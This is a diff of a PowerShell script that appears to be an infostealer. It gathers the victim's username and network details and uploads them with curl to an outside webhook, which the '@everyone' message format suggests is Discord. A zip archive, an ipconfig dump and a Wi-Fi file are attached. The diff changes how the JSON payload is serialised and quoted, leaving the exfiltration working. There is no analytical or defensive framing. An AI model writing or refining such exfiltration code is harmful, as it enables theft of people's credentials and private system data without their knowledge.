@@ -35,14 +35,17 @@ $networkInfo = (Get-NetAdapter | ForEach-Object { $a=$_; $ips=Get-NetIPAddress -
 
 
 $whoami_content = whoami
-$payload = (@{ content = "@everyone: $whoami_content | $networkInfo" } | ConvertTo-Json -Compress)
+$payload = [System.Text.Json.JsonSerializer]::Serialize(@{
+    content = "@everyone: $whoami_content | $networkInfo"
+})
 
+# remove newlines just in case
+$payload = $payload -replace "\r?\n"," "
 
 & curl.exe -X POST `
-  -H "Content-Type: application/json" `
   -F "payload_json=$payload" `
   -F "file1=@$zip" `
-  -F "file2=@$e\ipcfg.txt" `
+  -F "file2=@${e}\ipcfg.txt" `
   -F "file3=@$wifiFile" `
   "$wh"   
 
